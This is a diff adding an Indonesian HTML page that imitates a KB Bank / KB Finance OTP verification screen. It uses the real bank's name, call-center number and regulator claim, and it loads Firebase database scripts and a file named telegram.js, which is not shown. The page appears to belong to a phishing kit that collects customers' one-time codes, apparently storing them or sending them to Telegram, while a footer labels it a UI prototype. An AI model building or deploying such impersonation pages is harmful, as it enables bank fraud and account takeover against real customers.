@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Verifikasi kode keamanan KB BANK FIANCE">
+  <title>KB BANK FIANCE — Verifikasi Kode</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .verification-card{margin-top:-40px}
+    .verification-info{
+      margin-bottom:20px;padding:14px;border-radius:14px;color:#604a75;
+      background:#f7f1fd;font-size:11px;line-height:1.55
+    }
+    .verification-info strong{display:block;margin-bottom:4px;font-size:12px}
+    .test-code{
+      display:flex;align-items:center;justify-content:space-between;gap:12px;
+      margin-top:10px;padding:10px 12px;border-radius:11px;background:#fff;border:1px solid #eadcf8
+    }
+    .test-code span:first-child{color:var(--muted);font-size:10px}
+    .test-code code{color:var(--purple-dark);font-size:18px;font-weight:900;letter-spacing:.16em}
+    .otp{display:grid;grid-template-columns:repeat(6,1fr);gap:8px}
+    .otp input{
+      width:100%;height:52px;border:1px solid var(--line);border-radius:13px;outline:none;
+      background:#fafafa;text-align:center;font-size:20px;font-weight:800
+    }
+    .otp input:focus{border-color:var(--purple);box-shadow:0 0 0 3px rgba(126,34,216,.1);background:#fff}
+    .timer{margin:16px 0 20px;text-align:center;color:var(--muted);font-size:11px}
+    .resend{border:0;color:var(--purple);background:transparent;font-weight:800;cursor:pointer}
+    .resend:disabled{color:#aaa;cursor:not-allowed}
+  </style>
+</head>
+<body>
+  <main class="app-phone">
+    <section class="mobile-hero">
+      <div class="statusbar">
+        <span>06.33</span>
+        <div class="status-icons"><span>▮▮▮</span><span>⌁</span><span class="battery">22</span></div>
+      </div>
+
+      <div class="hero-nav">
+        <button class="back-button" id="backButton" type="button" aria-label="Kembali">←</button>
+        <button class="language-button" type="button"><span>⌄ ID</span><span class="flag"></span></button>
+      </div>
+
+      <div class="hero-copy">
+        <div class="step"><span class="step-dot"></span>Langkah verifikasi keamanan</div>
+        <h1>Verifikasi Kode</h1>
+        <p>Masukkan kode 6 digit untuk melanjutkan proses pengajuan.</p>
+      </div>
+    </section>
+
+    <section class="mobile-card verification-card">
+      <div class="card-title">
+        <h2>KB FINANCE</h2>
+        <p>Solusi Pembiayaan Terpercaya</p>
+      </div>
+
+      <div class="verification-info">
+  <strong>Halo KB Bank 14005</strong>
+  CALL CENTER
+  PT Bank KB Indonesia Tbk Berizin dan Diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia.
+</div>
+
+      <form id="verificationForm" novalidate>
+        <div class="field">
+          <label>Kode Verifikasi</label>
+          <div class="otp" aria-label="Kode verifikasi 6 digit">
+            <input aria-label="Digit 1" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+            <input aria-label="Digit 2" maxlength="1" inputmode="numeric">
+            <input aria-label="Digit 3" maxlength="1" inputmode="numeric">
+            <input aria-label="Digit 4" maxlength="1" inputmode="numeric">
+            <input aria-label="Digit 5" maxlength="1" inputmode="numeric">
+            <input aria-label="Digit 6" maxlength="1" inputmode="numeric">
+          </div>
+        </div>
+
+        <div class="timer">
+          Kode baru dapat dibuat dalam <span id="countdown">30</span> detik.
+          <button id="resendButton" class="resend" type="button" disabled>Buat kode baru</button>
+        </div>
+
+        <button id="verifyButton" class="primary-mobile" type="submit" disabled>VERIFIKASI KODE →</button>
+        <div id="message" class="message" role="status" aria-live="polite"></div>
+      </form>
+    </section>
+
+    <div class="progress-dots"><span></span><span></span><span class="active"></span></div>
+    <div class="footer-note">Jangan pernah membagikan OTP asli dari bank atau layanan keuangan kepada pihak lain.</div>
+    <div class="home-indicator"></div>
+  </main>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="telegram.js"></script>
+  <script src="verifikasi-sms.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
